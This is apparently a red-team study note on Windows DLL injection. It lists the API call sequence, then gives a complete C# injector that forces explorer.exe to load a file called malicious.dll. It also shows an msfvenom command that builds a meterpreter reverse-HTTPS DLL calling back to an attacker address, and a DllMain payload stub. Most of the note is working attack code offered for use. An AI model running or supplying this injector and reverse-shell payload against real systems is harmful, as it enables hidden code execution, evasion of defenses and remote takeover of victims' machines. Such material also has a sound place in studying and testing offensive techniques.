---
tags:
  - Advanced
  - Code_Injection
  - DLL_Injection
  - Defense_Evasion
  - Windows
---

## DLL Injection Theory
resources: [MITRE ATT&CK - DLL Injection](https://attack.mitre.org/techniques/T1055/001/)

> [!info] Load malicious DLL into target process. DLL executes in context of target process.

### DLL Injection Flow
> [!tip] Injection sequence:
> 1. Get handle to target process (**OpenProcess**)
> 2. Allocate memory for DLL path string (**VirtualAllocEx**)
> 3. Write DLL path to allocated memory (**WriteProcessMemory**)
> 4. Get address of **LoadLibraryA** in kernel32.dll
> 5. Create remote thread calling **LoadLibraryA** with DLL path (**CreateRemoteThread**)

### Required APIs
> - **OpenProcess** - Get handle to target process
> - **VirtualAllocEx** - Allocate memory for DLL path
> - **WriteProcessMemory** - Write DLL path string
> - **GetModuleHandle** - Get kernel32.dll base address
> - **GetProcAddress** - Get LoadLibraryA address
> - **CreateRemoteThread** - Call LoadLibraryA with DLL path

## DLL Injection with C#

### API Imports
```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

public class DllInjector
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}
```

### Complete C# DLL Injector
```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

public class DllInjector
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    static void Main(string[] args)
    {
        string dllPath = @"C:\path\to\malicious.dll";

        // Find target process
        Process[] procs = Process.GetProcessesByName("explorer");
        int pid = procs[0].Id;

        // Open process
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

        // Allocate memory for DLL path
        byte[] dllPathBytes = Encoding.ASCII.GetBytes(dllPath + "\0");
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPathBytes.Length, 0x3000, 0x04);

        // Write DLL path
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, dllPathBytes, dllPathBytes.Length, out outSize);

        // Get LoadLibraryA address
        IntPtr kernel32 = GetModuleHandle("kernel32.dll");
        IntPtr loadLibrary = GetProcAddress(kernel32, "LoadLibraryA");

        // Create remote thread to call LoadLibraryA
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibrary, addr, 0, IntPtr.Zero);
    }
}
```

### Create Malicious DLL [Local]

#### msfvenom DLL
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<AttackerIP> LPORT=<Port> -f dll -o malicious.dll
```

#### Custom DLL with DllMain
```csharp
// Compile as Class Library (DLL)
using System;
using System.Runtime.InteropServices;

public class MaliciousDll
{
    [DllExport("DllMain", CallingConvention = CallingConvention.StdCall)]
    public static bool DllMain(IntPtr hModule, uint ul_reason_for_call, IntPtr lpReserved)
    {
        if (ul_reason_for_call == 1) // DLL_PROCESS_ATTACH
        {
            // Payload executes when DLL is loaded
            System.Diagnostics.Process.Start("calc.exe");
        }
        return true;
    }
}
```
